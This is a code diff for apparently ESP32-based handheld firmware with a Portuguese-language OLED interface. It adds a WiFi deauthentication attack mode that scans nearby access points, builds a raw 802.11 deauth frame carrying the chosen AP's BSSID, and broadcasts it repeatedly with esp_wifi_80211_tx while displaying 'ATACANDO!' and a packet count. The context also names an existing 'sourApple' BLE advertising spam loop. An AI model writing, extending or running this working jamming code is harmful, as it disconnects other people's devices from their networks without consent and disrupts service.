@@ -1,4 +1,5 @@
 #include "config.h"
+#include <esp_wifi.h>
 
 namespace {
   BLEScan* pBLEScan = nullptr;
@@ -239,5 +240,130 @@ void sourAppleLoop() {
     delay(20);
     pAdvertising->stop();
     delay(30);
+  }
+}
+
+namespace {
+  bool deauthActive = false;
+  int deauthSelectedAp = 0;
+  int deauthApCount = 0;
+  unsigned long lastDeauthScan = 0;
+  unsigned long deauthStartTime = 0;
+  int deauthPacketCount = 0;
+  uint8_t deauthFrame[26] = {
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x07, 0x00
+  };
+}
+
+void wifiDeauthAttackSetup() {
+  u8g2.clearBuffer();
+  drawFunctionHeader("WiFi Deauth");
+  u8g2.setFont(u8g2_font_6x10_tr);
+  u8g2.setCursor(0, 28);
+  u8g2.print("Scanning APs...");
+  u8g2.sendBuffer();
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  WiFi.setTxPower(WIFI_POWER_19_5dBm);
+  delay(100);
+  deauthApCount = WiFi.scanNetworks();
+  deauthSelectedAp = 0;
+  deauthActive = false;
+  lastDeauthScan = millis();
+  deauthPacketCount = 0;
+}
+
+void wifiDeauthAttackLoop() {
+  if (buttonPressed(BTN_BACK)) {
+    deauthActive = false;
+    WiFi.disconnect();
+    current_screen = 0;
+    drawMenu();
+    delay(200);
+    return;
+  }
+  
+  if (!deauthActive) {
+    if (buttonPressed(BTN_SELECT) && deauthApCount > 0) {
+      deauthActive = true;
+      deauthStartTime = millis();
+      deauthPacketCount = 0;
+      
+      uint8_t bssid[6];
+      String bssidStr = WiFi.BSSIDstr(deauthSelectedAp);
+      if (sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                 &bssid[0], &bssid[1], &bssid[2],
+                 &bssid[3], &bssid[4], &bssid[5]) == 6) {
+        for (int i = 0; i < 6; i++) {
+          deauthFrame[10 + i] = bssid[i];
+          deauthFrame[16 + i] = bssid[i];
+        }
+      }
+      delay(200);
+    }
+    
+    if (millis() - lastDeauthScan > 10000) {
+      deauthApCount = WiFi.scanNetworks();
+      lastDeauthScan = millis();
+      if (deauthSelectedAp >= deauthApCount) deauthSelectedAp = max(deauthApCount - 1, 0);
+    }
+    
+    u8g2.clearBuffer();
+    drawFunctionHeader("WiFi Deauth");
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.setCursor(0, 22);
+    u8g2.print("APs:");
+    for (int i = 0; i < 3 && i < deauthApCount; i++) {
+      u8g2.setCursor(0, 34 + (i * 10));
+      if (i == deauthSelectedAp) u8g2.print("> ");
+      else u8g2.print("  ");
+      String ssid = WiFi.SSID(i);
+      if (ssid.length() > 12) ssid = ssid.substring(0, 12);
+      u8g2.print(ssid);
+      u8g2.print(" ");
+      u8g2.print(WiFi.RSSI(i));
+    }
+    if (deauthApCount == 0) {
+      u8g2.setCursor(0, 40);
+      u8g2.print("Nenhum AP encontrado");
+    }
+    u8g2.setCursor(0, 62);
+    u8g2.print("SEL:Atacar B:Menu");
+    u8g2.sendBuffer();
+    
+    if (buttonPressed(BTN_DOWN) && deauthSelectedAp < deauthApCount - 1) deauthSelectedAp++;
+    if (buttonPressed(BTN_UP) && deauthSelectedAp > 0) deauthSelectedAp--;
+  } else {
+    for (int i = 0; i < 15; i++) {
+      esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
+      deauthPacketCount++;
+      delay(1);
+    }
+    
+    u8g2.clearBuffer();
+    drawFunctionHeader("WiFi Deauth");
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.setCursor(0, 28);
+    u8g2.print("ATACANDO!");
+    u8g2.setCursor(0, 40);
+    u8g2.print("AP: ");
+    String ssid = WiFi.SSID(deauthSelectedAp);
+    if (ssid.length() > 12) ssid = ssid.substring(0, 12);
+    u8g2.print(ssid);
+    u8g2.setCursor(0, 52);
+    u8g2.print("Pkts: ");
+    u8g2.print(deauthPacketCount);
+    u8g2.setCursor(0, 62);
+    u8g2.print("SEL:Parar B:Menu");
+    u8g2.sendBuffer();
+    
+    if (buttonPressed(BTN_SELECT)) {
+      deauthActive = false;
+      delay(200);
+    }
   }
 }
